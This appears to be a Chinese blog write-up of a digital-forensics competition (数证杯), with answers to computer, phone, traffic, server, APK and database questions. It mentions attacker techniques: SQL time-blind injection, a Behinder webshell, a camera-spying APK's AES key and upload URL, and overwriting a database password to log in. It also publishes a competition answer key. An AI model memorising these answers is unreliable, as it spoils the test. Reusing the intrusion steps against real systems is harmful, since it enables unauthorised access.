    <content type="html"><![CDATA[<h1 id="数证杯决赛——个人赛"><a href="#数证杯决赛——个人赛" class="headerlink" title="数证杯决赛——个人赛"></a>数证杯决赛——个人赛</h1><pre><code>容器挂载密码：4zL!$WpRkmANv@XFQ#7HdEyU&amp;GpoTb56YZ^Jq83!Wr(tqA%XsPB7f@CY1xRmKH9#Le*WVG9NuvT$kJ2@7b64Tp(FLM#zqRY8Hv%!KU^9C&amp;YXL*powq87Hr检材下载链接：链接:https://pan.baidu.com/s/12ZZnIfc7ifYoTNi9H8ZqsA?pwd=5g81 提取码:5g81</code></pre><h2 id="计算机部分"><a href="#计算机部分" class="headerlink" title="计算机部分"></a>计算机部分</h2><h3 id="1-填空题"><a href="#1-填空题" class="headerlink" title="1. [填空题]"></a>1. [填空题]</h3><pre><code>计算机中曾挂载的Bitlocker加密分区的恢复密钥后6位为？（答案格式：6位数字） (1分)</code></pre><pre><code>700755</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337394.png" alt="image-20241203170504735"></p><h3 id="2-填空题"><a href="#2-填空题" class="headerlink" title="2. [填空题]"></a>2. [填空题]</h3><pre><code>请写出曾远程连接过该计算机的IP；（答案格式：6.6.6.6） (1分)</code></pre><pre><code>192.168.50.227</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337395.png" alt="image-20241203170532072"></p><h3 id="3-填空题"><a href="#3-填空题" class="headerlink" title="3. [填空题]"></a>3. [填空题]</h3><pre><code>计算机中曾挂载的vhd非加密分区驱动器号为？（答案格式：大写，如D） (1分)</code></pre><pre><code>M</code></pre><p>发现计算机中一共有两个vhd虚拟磁盘</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337396.png" alt="image-20241203170735884"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337397.png" alt="image-20241203170654195"></p><p>仿真起计算机 尝试挂载一下两个虚拟磁盘 发现这个996600.vhd可以直接挂载 挂载后盘符是M</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337398.png" alt="image-20241203173023122"></p><p>而另一个338899挂载上是被bitlocker加密的 上面咱们密钥也拿到了 也能挂载 但是挂上是空的 没啥用</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337399.png" alt="image-20241203173135250"></p><h3 id="4-填空题"><a href="#4-填空题" class="headerlink" title="4. [填空题]"></a>4. [填空题]</h3><pre><code>接上题，分区中最后修改时间的文件MD5值为？（答案格式：全大写） (1分)</code></pre><pre><code>D5F560E72A5BE2FF518DA52BBCF2EB8E</code></pre><p>回到刚才挂载的M盘 看一下最后修改的文件 是<code>direct_url.json</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337400.png" alt="image-20241203173245690"></p><p>我直接往里面传一个fHash算md5 hhh 按要求进行大写</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337401.png" alt="image-20241203173350989"></p><p>当然用命令也可以</p><pre><code>certutil -hashfile direct_url.json MD5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337402.png" alt="image-20241203173526652"></p><h3 id="5-填空题"><a href="#5-填空题" class="headerlink" title="5. [填空题]"></a>5. [填空题]</h3><pre><code>请找到计算机中的Veracrypt加密容器，并写出其解密密码？（答案格式：字母大小写与实际需一致） (6分)</code></pre><pre><code>1P2P3$$PIAN5P6P78PIAN</code></pre><p>在<code>/Document/DYPG/</code>文件夹下找到一个npbk文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337403.png" alt="image-20241203171216228"></p><p>开始以为这个是vc容器 放到passwarekit之后发现竟然识别出来是个7z压缩包 改后缀解压 发现是个nox的嵌套镜像 放到火眼中继续分析</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337404.png" alt="image-20241203171413369"></p><p>在微信聊天记录中找到vc容器密码图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337405.png" alt="image-20241203171348696"></p><h3 id="6-填空题"><a href="#6-填空题" class="headerlink" title="6. [填空题]"></a>6. [填空题]</h3><pre><code>请写出IP为202.113.81.243的发件人向机主发送的邮件附件MD5值；（答案格式：全大写） (1分)补充：题干中所述发送的邮件指的是某IP向机主发送的最后一封邮件！</code></pre><pre><code>6CF25FFF7D2882DBF5722B3B9E382B5F</code></pre><p>直接在结果中过滤一下发件人ip 因为是最后一封邮件 所以对应的附件应该是新建文件夹(2).rar 算一下md5</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412081214128.png" alt="image-20241208121411028"></p><h3 id="7-填空题"><a href="#7-填空题" class="headerlink" title="7. [填空题]"></a>7. [填空题]</h3><pre><code>计算机中Will Wight - Cradle Series (Books 1-12)- MOBI.torrent文件的下载地址为？（答案格式：http://...） (1分)</code></pre><pre><code>http://suprbaydvdcaynfo4dgdzgxb4zuso7rftlil5yg5kqjefnw4wq4ulcad.onion/attachment.php?aid=4130</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337406.png" alt="image-20241203171649071"></p><h3 id="8-填空题"><a href="#8-填空题" class="headerlink" title="8. [填空题]"></a>8. [填空题]</h3><pre><code> 计算机中lqrazqq016j41.jpg文件的删除时间为？（UTC+0800）（答案格式：1990-01-01 01:01:01） (1分)</code></pre><pre><code>2024-11-09 21:59:48</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337407.png" alt="image-20241203171718049"></p><h3 id="9-填空题"><a href="#9-填空题" class="headerlink" title="9. [填空题]"></a>9. [填空题]</h3><pre><code>Fikret Ceker曾经向机主发送过一张照片，请找到该图片写出其拍摄的GPS坐标；（答案格式：保留小数点后4位，如33.3333N,33.3333E） (3分)</code></pre><pre><code>40.0112N,112.7000E</code></pre><p>在邮件记录中找到发送的图片 导出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337408.png" alt="image-20241203171845875"></p><p>转一下就行了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337409.png" alt="image-20241203171915272"></p><h3 id="10-填空题"><a href="#10-填空题" class="headerlink" title="10. [填空题]"></a>10. [填空题]</h3><pre><code>计算机中用户“李四”在最后一次成功登录之前登录失败了多少次？ （答案格式：纯数字） (3分)</code></pre><pre><code>6</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337410.png" alt="image-20241203172008630"></p><h2 id="手机部分"><a href="#手机部分" class="headerlink" title="手机部分"></a>手机部分</h2><h3 id="1-填空题-1"><a href="#1-填空题-1" class="headerlink" title="1. [填空题]"></a>1. [填空题]</h3><pre><code> 分析手机检材，写出苹果手机的序列号是多少？（答案格式：大小写与实际需一致） (1分)</code></pre><pre><code>FK3XDN2UKPJ5</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337411.png" alt="image-20241203172148619"></p><h3 id="2-填空题-1"><a href="#2-填空题-1" class="headerlink" title="2. [填空题]"></a>2. [填空题]</h3><pre><code>分析手机检材，写出嫌疑人facebook账号的密码是多少？（答案格式：大小写与实际需一致） (1分)</code></pre><pre><code>1234qwer</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337412.png" alt="image-20241203172216387"></p><h3 id="3-多选题"><a href="#3-多选题" class="headerlink" title="3. [多选题]"></a>3. [多选题]</h3><pre><code>分析手机检材，下列哪些地址是嫌疑人曾经去过的？ (2分)A. 南宁市青秀区B. 南宁市江南区C. 济南市历城区D. 上海市松江区E. 上海市宝山区</code></pre><pre><code>AD</code></pre><p>首先第五个是很好找到的 高德地图解析出来的有很多是宝山区</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337413.png" alt="image-20241203172317812"></p><p>第一个就是在翻图片的时候 先是发现有个手机截图里面提到南宁建政路</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337414.png" alt="image-20241203172404034"></p><p>ai问了一下 确实是在青秀区</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337415.png" alt="image-20241203172448175"></p><p>后面在手机拍照的图片中也找到了建政路美食街的图片 证明去过</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337416.png" alt="image-20241203172528973"></p><h3 id="4-填空题-1"><a href="#4-填空题-1" class="headerlink" title="4. [填空题]"></a>4. [填空题]</h3><pre><code>分析手机检材，嫌疑人安装了用于记账的APP，请问该APP的包名是什么？（答案格式：com.abc.abc） (1分)</code></pre><pre><code>com.maicai.freejizhang</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337417.png" alt="image-20241203172609462"></p><h3 id="5-填空题-1"><a href="#5-填空题-1" class="headerlink" title="5. [填空题]"></a>5. [填空题]</h3><pre><code>分析手机检材，嫌疑人记账APP中记录的使用支付宝支付的用于礼金红包的金额一共是多少？（答案格式：请写整数金额，如1230元） (5分)</code></pre><pre><code>170000元</code></pre><p>也是要翻数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337418.png" alt="image-20241203172933897"></p><p>用navicat打开</p><p>首先在<code>TBL_ACCOUNTINFO</code>表中看到使用支付宝支付对应的uuid是<code>7EB78B8F64E24EB6956DC9DB44720794</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337419.png" alt="image-20241203173941490"></p><p>再在<code>TBL_OUTGOCATEGORYINFO</code>表中看到礼金红包对应的uuid应该是1701</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337420.png" alt="image-20241203174243981"></p><p>然后找到<code>TBL_TRADE</code>表中记账的明细 蓝框中的部分才是又满足是支付宝支付又是礼金红包的金额</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337421.png" alt="image-20241203174438330"></p><p>看到左侧的money列 对应加起来是17000000 但是因为数额太大 猜测应该是以分为单位 所以应该是170000元</p><h3 id="6-填空题-1"><a href="#6-填空题-1" class="headerlink" title="6. [填空题]"></a>6. [填空题]</h3><p>分析手机检材，嫌疑人家里路由器密码是多少？（答案格式：大小写与实际需一致） (3分)</p><pre><code>201808188</code></pre><p>这里是继续翻应用程序 找到一个锤子便签</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337422.png" alt="image-20241203172714968"></p><p>直接搜包名 找数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337423.png" alt="image-20241203172805989"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337424.png" alt="image-20241203172756142"></p><h3 id="7-填空题-1"><a href="#7-填空题-1" class="headerlink" title="7. [填空题]"></a>7. [填空题]</h3><pre><code>分析手机检材，写出嫌疑人最新家庭地址；（答案格式：XX市XX区XX路XX弄 (1分)</code></pre><pre><code>上海市浦东新区张杨北路2899弄</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337425.png" alt="image-20241203172840802"></p><h3 id="8-填空题-1"><a href="#8-填空题-1" class="headerlink" title="8. [填空题]"></a>8. [填空题]</h3><pre><code>分析手机检材，嫌疑人团伙走私的“大麻”的单价是每克多少元？（答案格式：XX元/克） (5分)</code></pre><pre><code>344</code></pre><p>这个根据微信聊天记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337426.png" alt="image-20241203174612060"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337427.png" alt="image-20241203174617761"></p><p>先让发货的价格 然后对面发了个图片 后面又发了个看着很像密码的东西 这不得不让人怀疑 我们先来找这个图片 找到导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337429.png" alt="image-20241203174711447"></p><p>放010中看一下 发现其实是个png 改了后缀名在放进去 发现文件末尾有冗余数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337430.png" alt="image-20241203174823045"></p><p>直接在010里面提出来另存为 这里可以使用magika工具来识别类型 是个cdf文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052126764.png" alt="image-20241205212647668"></p><p>用WPS打开 发现需要输入密码 用上面的<code>mm20241105</code> 打开看到大麻价格</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052127778.png" alt="image-20241205212733716"></p><h2 id="网络流量部分"><a href="#网络流量部分" class="headerlink" title="网络流量部分"></a>网络流量部分</h2><h3 id="1-填空题-2"><a href="#1-填空题-2" class="headerlink" title="1. [填空题]"></a>1. [填空题]</h3><pre><code>分析网络流量包，请问目录遍历攻击开始时间是什么时候？（答案格式：1990-01-01 01:01:01） (1分)</code></pre><pre><code>2024-10-24 17:26:12</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337431.png" alt="image-20241203175804687"></p><h3 id="2-单选题"><a href="#2-单选题" class="headerlink" title="2. [单选题]"></a>2. [单选题]</h3><pre><code>分析网络流量包，可以发现哪种攻击行为？ (1分)A. 网络钓鱼B. SQL注入C. 拒绝服务攻击D. 恶意软件传播E. 中间人攻击</code></pre><pre><code>B</code></pre><p>sql延时注入攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337432.png" alt="image-20241203175608780"></p><h3 id="3-填空题-1"><a href="#3-填空题-1" class="headerlink" title="3. [填空题]"></a>3. [填空题]</h3><pre><code>分析网络流量包，黑客获取到的数据库名称是？（答案格式：小写） (3分)</code></pre><pre><code>secret</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337433.png" alt="image-20241203175558426"></p><h3 id="4-填空题-2"><a href="#4-填空题-2" class="headerlink" title="4. [填空题]"></a>4. [填空题]</h3><pre><code>分析网络流量包，黑客通过时间盲注获取到的数据是什么？（答案格式：与实际大小写保持一致） (6分)</code></pre><pre><code>th!s_1s_5ecret!</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337434.png" alt="image-20241203175451170"></p><h3 id="5-填空题-2"><a href="#5-填空题-2" class="headerlink" title="5. [填空题]"></a>5. [填空题]</h3><pre><code>分析网络流量包，黑客使用什么webshell管理工具控制服务器？（答案格式：请写中文名，无需填写版本号） (3分)</code></pre><pre><code>冰蝎</code></pre><p>一眼冰蝎</p><h3 id="6-填空题-2"><a href="#6-填空题-2" class="headerlink" title="6. [填空题]"></a>6. [填空题]</h3><pre><code>分析网络流量包，黑客通过后门执行的最后一条命令是什么？（答案格式：与实际大小写保持一致） (5分)</code></pre><pre><code>type login.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337699.png" alt="image-20241205233723207"></p><h2 id="服务器部分"><a href="#服务器部分" class="headerlink" title="服务器部分"></a>服务器部分</h2><h3 id="1-填空题-3"><a href="#1-填空题-3" class="headerlink" title="1. [填空题]"></a>1. [填空题]</h3><pre><code>重建完整的系统后，redis对外暴露的端口号是多少？（答案格式：数字） (3分)</code></pre><pre><code>16379</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110433.png" alt="image-20241205211019329"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110301.png" alt="image-20241205211024226"></p><h3 id="2-填空题-2"><a href="#2-填空题-2" class="headerlink" title="2. [填空题]"></a>2. [填空题]</h3><pre><code>请找出加密mysql数据库连接密码所用的加密密钥（盐值）？（答案格式：注意大小写） (3分)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110966.jpg" alt="img"></p><p>找到用于部署网站的jar包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110970.jpg" alt="img"> </p><pre><code>F*DZ-kZMs5qt</code></pre><h3 id="3-填空题-2"><a href="#3-填空题-2" class="headerlink" title="3. [填空题]"></a>3. [填空题]</h3><pre><code> 请分析得出相亲网站的后台数据库中哪张表存放了会员相关信息，写出表名？ (6分)</code></pre><pre><code>a_member_st</code></pre><p>进网站的步骤看下一题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110112.jpg" alt="img"> </p><p>可以看到会员相关信息，无法导出，这里使用全局搜索大法，选择一个联系方式去检材里搜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110115.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052110108.jpg" alt="img"> </p><p>发现文件里有sql语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337435.jpg" alt="img"> </p><p>a_member_st</p><h3 id="4-填空题-3"><a href="#4-填空题-3" class="headerlink" title="4. [填空题]"></a>4. [填空题]</h3><pre><code>已知用户在系统中的所有操作都会被记录，请找出用户在“查询角色”时，其请求的后端路径地址为？（格式：/api/query/...） (3分)</code></pre><pre><code>/zwz/role/getAllByPage</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337436.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052111209.jpg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052111210.jpg" alt="img"> </p><p>进数据库 &#x2F;zwz&#x2F;role&#x2F;getAllByPage</p><h3 id="5-填空题-3"><a href="#5-填空题-3" class="headerlink" title="5. [填空题]"></a>5. [填空题]</h3><pre><code>请分析得出数据库用户表中status为-1状态值的含义为？（格式：学生） (1分)</code></pre><pre><code>禁用</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052111799.jpg" alt="img"></p><p>新建一个用户，把password替换一下就可以用你新建的密码登录了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052111804.jpg" alt="img"></p><h3 id="6-填空题-3"><a href="#6-填空题-3" class="headerlink" title="6. [填空题]"></a>6. [填空题]</h3><pre><code>请统计平均月均收入第二高的省份（省份包含三大类：省、直辖市、自治区）（答案格式：请写出完整的省份名（或直辖市名、自治区名），如江西省、天津市、西藏自治区） (3分)</code></pre><pre><code>内蒙古自治区</code></pre><p>第三题的sql语句全部复制到word里</p><p>使用最原始的方法统计</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052111138.jpg" alt="img"> </p><p>再删掉最前面和最后面的括号，简单的数据处理就做好啦，再粘贴到xlsx里面使用分列功能</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337437.jpg" alt="img"> </p><p>再把引号去掉，同时删掉不需要的数据</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052112264.png" alt="image-20241205211203214"></p><pre><code>=AVERAGEIFS(A:A, B:B, B1)  //xlsx是世界上最棒的编程语言</code></pre><p>内蒙古自治区</p><h2 id="APK部分"><a href="#APK部分" class="headerlink" title="APK部分"></a>APK部分</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><pre><code>分析APK检材，请问程序申请了几项系统权限?格式:6)(2分)</code></pre><pre><code>4</code></pre><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337438.jpg" alt="img"></td></tr></tbody></table><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><pre><code>分析APK检材，请写出程序的入口邀请码,(答案格式:与实际大小写保持一致)(6分)</code></pre><pre><code>ABCDEF</code></pre><p>从入口函数看是从so文件加载的</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052115577.jpg" alt="img"></p><p>拆包定位对应函数名发现明文比对</p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><pre><code>分析APK检材，该程序进行恶意行为时保存的文件使用的加密算法及加密模式是?(答案格式:大写，如XXX-XXX)(1分)</code></pre><pre><code>AES-GCM</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052116710.jpeg" alt="img"></p><p>XXX-XXX盲猜AES</p><p>验证：</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052116034.jpg" alt="img"> </p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><pre><code>分析APK检材，该程序进行恶意行为时保存的文件使用的加密密钥的？（答案格式：与实际大小写保持一致）（3分）</code></pre><pre><code>0123456789abcdef0123456789abcdef</code></pre><p>根据前一题定位到AES加密调用部分，bArr2是密钥，一路向上追踪发现是从GalleryActivity获取的，<code>stringFromJNI()</code>说明是来自so文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052117162.jpg" alt="img"> </p><p>跟进到GalleryActivity发现还是来自前面用到的so文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052117187.jpeg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052117828.jpeg" alt="img"> </p><p>根据java层代码，发现是aes128，截取前16位</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052118647.jpeg" alt="img"></p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><pre><code>分析APK检材，该程序上传文件的服务器通信URL是多少?(答案格式:https://xxxx/xx/xx)(1分)</code></pre><pre><code>https://biwuzhuanyongurl.com/upload</code></pre><p>一分的题，估计是直接写了明文，根据提示<code>https</code>直接搜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052118675.jpeg" alt="img"> </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052118740.jpg" alt="img"> </p><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><pre><code>分析APK检材，以下哪个是该程序存在的恶意行为?(1分)</code></pre><p>提示很多：</p><p>aes加密这里是图片相关</p><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td></td><td><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052337439.jpg" alt="img"></td></tr></tbody></table><p>全篇都是camera相关</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052119317.jpeg" alt="img"> </p><p>基本上可以确定是拍照并上传，现在要确定是前置还是后置 猜也是前置，恶意软件调用前置获取人脸等敏感信息</p><p>搜front发现确实是前置</p><p>  <img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052114608.jpg" alt="img"> </p><p>前面题目aes部分、url部分都在k类里面，翻一下k类也能看到前置摄像头</p><h2 id="数据分析部分"><a href="#数据分析部分" class="headerlink" title="数据分析部分"></a>数据分析部分</h2><h3 id="1-填空题-4"><a href="#1-填空题-4" class="headerlink" title="1. [填空题]"></a>1. [填空题]</h3><pre><code>分析数据库检材，该数据库中会员姓名包含“强”字的会员数量为多少？（答案格式：纯数字） (1分)</code></pre><pre><code>2945</code></pre><p> 检材给到一个sql文件 我们首先要先把这个sql文件加载到我们本地的数据库中 看到这个数据库名为geren</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052304156.png" alt="image-20241205230422986"></p><p>我们就用navicat连上本地数据库之后 新建一个名为geren的数据库 然后右键导入数据库就行</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052318502.png" alt="image-20241205231812318"></p><p>直接运行sql查询语句</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052301897.png" alt="image-20241205230150644"></p><h3 id="2-填空题-3"><a href="#2-填空题-3" class="headerlink" title="2. [填空题]"></a>2. [填空题]</h3><pre><code>属于会员id“89378”的直接下级用户数为多少？（答案格式：纯数字） (1分)</code></pre><pre><code>11</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052320433.png" alt="image-20241205232011223"></p><h3 id="3-填空题-3"><a href="#3-填空题-3" class="headerlink" title="3. [填空题]"></a>3. [填空题]</h3><pre><code>请计算每名会员的总返佣金额，写出总返佣金额最大的会员id；（答案格式：纯数字） (3分)</code></pre><pre><code>87314</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052324498.png" alt="image-20241205232448373"></p><h3 id="4-填空题-4"><a href="#4-填空题-4" class="headerlink" title="4. [填空题]"></a>4. [填空题]</h3><pre><code>计算在2024年5月1日到2024年5月30日之间（包含5月1日和5月30日），总提现金额大于1000的用户数量；（答案格式：纯数字） (5分)</code></pre><pre><code>11756</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202412052332505.png" alt="image-20241205233254306"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;数证杯决赛——个人赛&quot;&gt;&lt;a href=&quot;#数证杯决赛——个人赛&quot; class=&quot;headerlink&quot; title=&quot;数证杯决赛——个人赛&quot;&gt;&lt;/a&gt;数证杯决赛——个人赛&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;容器挂载密码：
4zL!$WpRkmANv@XFQ#7HdE</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024第一届数证杯初赛wp(计算机、手机、流量分析部分)</title>
    <link href="http://w3nx1z1.github.io/posts/5a6e6323.html"/>
    <id>http://w3nx1z1.github.io/posts/5a6e6323.html</id>
    <published>2024-11-27T07:41:49.827Z</published>
    <updated>2025-02-14T08:30:17.445Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024第一届数证杯-计算机、手机、流量分析部分"><a href="#2024第一届数证杯-计算机、手机、流量分析部分" class="headerlink" title="2024第一届数证杯(计算机、手机、流量分析部分)"></a>2024第一届数证杯(计算机、手机、流量分析部分)</h1><h2 id="计算机取证"><a href="#计算机取证" class="headerlink" title="计算机取证"></a>计算机取证</h2><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><pre><code>对计算机镜像进行分析，计算该镜像中ESP分区的SM3值后8位为？（答案格式：大写字母与数字组合，如：D23DDF44） (2分)</code></pre><p> ai搜一下ESP分区的特征</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271558023.png" alt="image-20241127155857908"></p><p>找到并计算出SM3值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271559688.png" alt="image-20241127155921559"></p><p>后八位为</p><pre><code>BDBE1073</code></pre><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><pre><code>对计算机镜像进行分析，该操作系统超管账户最后一次注销时间为？（时区为UTC+08:00）（答案格式如：1970-01-01 00:00:00） (2分)</code></pre><pre><code>2024-10-25 22:57:32</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271601801.png" alt="image-20241127160113488"></p><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><pre><code>对计算机镜像进行分析，该操作系统超管账户有记录的登录次数为？（填写数字，答案格式如：1234） (2分)</code></pre><pre><code>24</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271603747.png" alt="image-20241127160337458"></p><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><pre><code>对计算机镜像进行分析，该操作系统设置的账户密码最长存留期为多少天？（填写数字，答案格式如：1234） (2分)</code></pre><pre><code>42</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271615474.png" alt="image-20241127161506383"></p><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><pre><code>对计算机镜像进行分析，该操作系统安装的数据擦除软件的版本为？（答案格式：1.23） (2分)</code></pre><pre><code>5.86</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271606726.png" alt="image-20241127160634591"></p><h3 id="6"><a href="#6" class="headerlink" title="6."></a>6.</h3><pre><code>对计算机镜像进行分析，该操作系统接入过一名称为“Realtek USB Disk autorun USB Device”的USB设备，其接入时分配的盘符为？（答案格式：A:） (2分)</code></pre><pre><code>E:</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271607167.png" alt="image-20241127160752036"></p><h3 id="7"><a href="#7" class="headerlink" title="7."></a>7.</h3><pre><code>对计算机镜像进行分析，该操作系统无线网卡分配的默认网关地址为？（答案格式：127.0.0.1） (2分)</code></pre><pre><code>192.168.43.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271616024.png" alt="image-20241127161626673"></p><h3 id="8"><a href="#8" class="headerlink" title="8."></a>8.</h3><p>对计算机镜像进行分析，该操作系统配置的连接NAS共享文件夹的IP地址为？（答案格式：127.0.0.1） (2分)</p><pre><code>192.168.188.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271618551.png" alt="image-20241127161828384"></p><h3 id="9"><a href="#9" class="headerlink" title="9."></a>9.</h3><pre><code>对计算机镜像进行分析，写出“吵群技巧.txt”文件SM3值的后8位？（大写字母与数字组合，如：D23DDF44） (2分)</code></pre><pre><code>10887ae1</code></pre><p>可以在计算机镜像中找到一个压缩包<code>话术、方法、技巧.zip</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271653178.png" alt="image-20241127165316036"></p><p>提取出来 放在010中看一下 找到吵群技巧.txt</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271654443.png" alt="image-20241127165404310"></p><p>解压出来 根据内容判断出来第二个文件是我们想找的这个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271655436.png" alt="image-20241127165522344"></p><p>找在线网站进行计算</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411271656618.png" 